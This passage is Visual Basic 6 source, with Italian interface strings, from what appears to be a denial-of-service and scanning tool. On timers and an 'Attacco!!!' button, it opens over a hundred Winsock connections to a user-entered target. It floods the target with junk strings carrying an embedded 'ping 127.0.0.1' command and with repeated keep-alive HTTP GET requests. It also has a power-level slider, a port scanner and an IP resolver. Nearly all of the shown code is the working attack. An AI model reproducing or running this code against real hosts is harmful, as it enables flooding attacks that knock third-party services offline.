Winsock111.Connect Text1.Text, Text4.Text
Winsock111.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock112.Close
Winsock112.Connect Text1.Text, Text4.Text
Winsock112.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock113.Close
Winsock113.Connect Text1.Text, Text4.Text
Winsock113.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock114.Close
Winsock114.Connect Text1.Text, Text4.Text
Winsock114.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock115.Close
Winsock115.Connect Text1.Text, Text4.Text
Winsock115.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Winsock116.Close
Winsock116.Connect Text1.Text, Text4.Text
Winsock116.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock117.Close
Winsock117.Connect Text1.Text, Text4.Text
Winsock117.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock118.Close
Winsock118.Connect Text1.Text, Text4.Text
Winsock118.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock119.Close
Winsock119.Connect Text1.Text, Text4.Text
Winsock119.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock120.Close
Winsock120.Connect Text1.Text, Text4.Text
Winsock120.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock121.Close
Winsock121.Connect Text1.Text, Text4.Text
Winsock121.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock122.Close
Winsock122.Connect Text1.Text, Text4.Text
Winsock122.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock123.Close
Winsock123.Connect Text1.Text, Text4.Text
Winsock123.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock124.Close
Winsock124.Connect Text1.Text, Text4.Text
Winsock124.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock125.Close
Winsock125.Connect Text1.Text, Text4.Text
Winsock125.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
ProgressBar1.Value = ProgressBar1.Value + 1
Winsock126.Close
Winsock126.Connect Text1.Text, Text4.Text
Winsock126.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock127.Close
Winsock127.Connect Text1.Text, Text4.Text
Winsock127.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock128.Close
Winsock128.Connect Text1.Text, Text4.Text
Winsock128.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock129.Close
Winsock129.Connect Text1.Text, Text4.Text
Winsock129.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock130.Close
Winsock130.Connect Text1.Text, Text4.Text
Winsock130.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1

Winsock131.Close
Winsock131.Connect Text1.Text, Text4.Text
Winsock131.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock132.Close
Winsock132.Connect Text1.Text, Text4.Text
Winsock132.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock133.Close
Winsock133.Connect Text1.Text, Text4.Text
Winsock133.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock134.Close
Winsock134.Connect Text1.Text, Text4.Text
Winsock134.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock135.Close
Winsock135.Connect Text1.Text, Text4.Text
Winsock135.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock136.Close
Winsock136.Connect Text1.Text, Text4.Text
Winsock136.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock137.Close
Winsock137.Connect Text1.Text, Text4.Text
Winsock137.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock138.Close
Winsock138.Connect Text1.Text, Text4.Text
Winsock138.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock139.Close
Winsock139.Connect Text1.Text, Text4.Text
Winsock139.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock140.Close
Winsock140.Connect Text1.Text, Text4.Text
Winsock140.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock141.Close
Winsock141.Connect Text1.Text, Text4.Text
Winsock141.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
ProgressBar1.Value = ProgressBar1.Value + 1
Winsock142.Close
Winsock142.Connect Text1.Text, Text4.Text
Winsock142.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock143.Close
Winsock143.Connect Text1.Text, Text4.Text
Winsock143.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock144.Close
Winsock144.Connect Text1.Text, Text4.Text
Winsock144.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock145.Close
Winsock145.Connect Text1.Text, Text4.Text
Winsock145.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock146.Close
Winsock146.Connect Text1.Text, Text4.Text
Winsock146.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock147.Close
Winsock147.Connect Text1.Text, Text4.Text
Winsock147.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock148.Close
Winsock148.Connect Text1.Text, Text4.Text
Winsock148.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock149.Close
Winsock149.Connect Text1.Text, Text4.Text
Winsock149.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock150.Close
Winsock150.Connect Text1.Text, Text4.Text
Winsock150.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock151.Close
Winsock151.Connect Text1.Text, Text4.Text
Winsock151.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock152.Close
Winsock152.Connect Text1.Text, Text4.Text
Winsock152.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock153.Close
Winsock153.Connect Text1.Text, Text4.Text
Winsock153.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock154.Close
Winsock154.Connect Text1.Text, Text4.Text
Winsock154.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock155.Close
Winsock155.Connect Text1.Text, Text4.Text
Winsock155.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock155.Close
Winsock155.Connect Text1.Text, Text4.Text
Winsock155.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock156.Close
Winsock156.Connect Text1.Text, Text4.Text
Winsock156.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
ProgressBar1.Value = ProgressBar1.Value + 1
If ProgressBar1.Value = 100 Then
ProgressBar1.Value = 0
End If

End Sub

Private Sub Timer3_Timer()
On Error Resume Next
Winsock1.Close
Winsock1.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock2.Close
Winsock2.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock3.Close
Winsock3.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock4.Close
Winsock4.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock5.Close
Winsock5.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock6.Close
Winsock6.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock7.Close
Winsock7.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock8.Close
Winsock8.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock9.Close
Winsock9.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock10.Close
Winsock10.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock11.Close
Winsock11.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock12.Close
Winsock12.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock13.Close
Winsock13.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock14.Close
Winsock14.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock15.Close
Winsock15.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock16.Close
Winsock16.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock17.Close
Winsock17.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock18.Close
Winsock18.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock19.Close
Winsock19.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock20.Close
Winsock20.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock21.Close
Winsock21.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock22.Close
Winsock22.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock23.Close
Winsock23.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock24.Close
Winsock24.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock25.Close
Winsock25.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock26.Close
Winsock26.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock27.Close
Winsock27.Connect Text1.Text, Text2.Text
Winsock28.Close
Winsock28.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
ProgressBar1.Value = ProgressBar1.Value + 1
Winsock29.Close
Winsock29.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock30.Close
Winsock30.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock31.Close
Winsock31.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock32.Close
Winsock32.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock33.Close
Winsock33.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock34.Close
Winsock34.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock35.Close
Winsock35.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock36.Close
Winsock36.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock37.Close
Winsock37.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock38.Close
Winsock38.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock39.Close
Winsock39.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock40.Close
Winsock40.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock41.Close
Winsock41.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock42.Close
Winsock42.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock43.Close
Winsock43.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock44.Close
Winsock44.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock45.Close
Winsock45.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock46.Close
Winsock46.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock47.Close
Winsock47.Connect Text1.Text, Text2.Text
Winsock48.Close
Winsock48.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock49.Close
Winsock49.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock50.Close
Winsock50.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock51.Close
Winsock51.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock52.Close
Winsock52.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock53.Close
Winsock53.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock54.Close
Winsock54.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock55.Close
Winsock55.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock56.Close
Winsock56.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock57.Close
Winsock57.Connect Text1.Text, Text2.Text
Winsock58.Close
Winsock58.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock59.Close
Winsock59.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock60.Close
Winsock60.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock61.Close
Winsock61.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock62.Close
Winsock62.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock63.Close
Winsock63.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock64.Close
Winsock64.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock65.Close
Winsock65.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock66.Close
Winsock66.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock67.Close
Winsock67.Connect Text1.Text, Text2.Text
Winsock68.Close
Winsock68.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock69.Close
Winsock69.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock70.Close
Winsock70.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock71.Close
Winsock71.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock72.Close
Winsock72.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock73.Close
Winsock73.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock74.Close
Winsock74.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock75.Close
Winsock75.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock76.Close
Winsock76.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock77.Close
Winsock77.Connect Text1.Text, Text2.Text
Winsock78.Close
Winsock78.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock79.Close
Winsock79.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
ProgressBar1.Value = ProgressBar1.Value + 1
Winsock80.Close
Winsock80.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock81.Close
Winsock81.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock82.Close
Winsock82.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock83.Close
Winsock83.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock84.Close
Winsock84.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock85.Close
Winsock85.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock86.Close
Winsock86.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock87.Close
Winsock87.Connect Text1.Text, Text2.Text
Winsock88.Close
Winsock88.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock89.Close
Winsock89.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock90.Close
Winsock90.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock91.Close
Winsock91.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock92.Close
Winsock92.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock93.Close
Winsock93.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock94.Close
Winsock94.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock95.Close
Winsock95.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock96.Close
Winsock96.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock97.Close
Winsock97.Connect Text1.Text, Text2.Text
Winsock98.Close
Winsock98.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock99.Close
Winsock99.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock100.Close
Winsock100.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock101.Close
Winsock101.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock102.Close
Winsock102.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock103.Close
Winsock103.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock104.Close
Winsock104.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
Winsock105.Close
Winsock105.Connect Text1.Text, Text2.Text
Label16.Caption = Label16.Caption + 1
ProgressBar1.Value = ProgressBar1.Value + 1
If ProgressBar1.Value = 100 Then
ProgressBar1.Value = 0
End If
End Sub

Private Sub Timer4_Timer()
Label19.BackColor = vbBlue
Timer5.Enabled = True
Timer4.Enabled = False

End Sub

Private Sub Timer5_Timer()
Label19.BackColor = vbRed
Timer5.Enabled = False
Timer4.Enabled = True
End Sub

Private Sub TimerCheck_Timer()
If SD.Value = 10 Then
Label1.Caption = "ATTENZIONE:MASSIMA POTENZA!!!"
End If
If SD.Value = 9 Then
Label1.Caption = "POTENZA ELEVATA"
End If
If SD.Value = 0 Then
Label1.Caption = "MINIMA POTENZA"
End If
If SD.Value = 5 Then
Label1.Caption = "NORMALE"
End If
End Sub

Private Sub TimerICMP_Timer()
Dim X As Integer
X = Ping(Text1.Text)
Label13.Caption = X

End Sub

Private Sub TimerPING_Timer()
Command1_Click
End Sub

Private Sub TimerPort_Timer()
On Error Resume Next
Text6.Text = Text6.Text + 1
WinsockScanner.Close
WinsockScanner.Connect Text1.Text, Text6.Text
If Text6.Text = Text7.Text Then
MsgBox "Scanner Terminato!", vbInformation
TimerPort.Enabled = False
xpButton9.Enabled = True
Text6.Enabled = True
End If
PB1.Value = Text6.Text
End Sub

Private Sub WinsockPacket_Connect()
On Error Resume Next
 WinsockPacket.SendData "GET / HTTP/1.1" & vbCrLf & "Host: " & Text1 & vbCrLf & vbCrLf
 packet = packet + 1
 Label21.Caption = packet
End Sub

Private Sub WinsockPacket_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
WinsockPacket.SendData "GET / HTTP/1.1" & vbCrLf & "Host: " & Text1 & vbCrLf & "Connection: Keep-alive" & vbCrLf & "Keep-alive: 300" & vbCrLf & vbCrLf
 packet = packet + 1
 Label21.Caption = packet
End Sub

Private Sub WinsockPacket_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
WinsockPacket.Close
End Sub

Private Sub WinsockResolve_Connect()
Text9.Text = WinsockResolve.RemoteHostIP
WinsockResolve.Close
End Sub

Private Sub WinsockResolve_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
WinsockResolve.Close
MsgBox "Errore Impossibile Trovare L'IP " + Description, vbCritical, "Trova IP"
End Sub

Private Sub WinsockScanner_Connect()
List1.AddItem "La Porta " & WinsockScanner.RemotePort & " é aperta"

End Sub

Private Sub WinsockUDP_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim data As String
WinsockUDP.GetData data
Text8.Text = data
End Sub

Private Sub xpButton1_Click()
On Error Resume Next
WinsockPacket.Close
Timer3.Enabled = True
Label19.Caption = "Attacco!!!"
Timer4.Enabled = True
WinsockPacket.Connect Text1.Text, Text2.Text
End Sub

Private Sub xpButton10_Click()
TimerPort.Enabled = False
xpButton9.Enabled = True
Text6.Enabled = True
End Sub

Private Sub xpButton11_Click()
MsgBox "La Funzionalita non è disponibile", vbExclamation
End Sub

Private Sub xpButton12_Click()
Form2.Show
End Sub

Private Sub xpButton13_Click()
Dim testo As String
testo = Inet1.OpenURL(Text1.Text)
Text8.Text = testo

End Sub

Private Sub xpButton14_Click()
Text8.Text = ""
End Sub

Private Sub xpButton2_Click()
Timer3.Enabled = False
Label19.Caption = "Stop"
Timer4.Enabled = False
Timer5.Enabled = False
Label19.BackColor = &H8000000F
WinsockPacket.Close
End Sub

Private Sub xpButton3_Click()
On Error Resume Next
WinsockResolve.Close
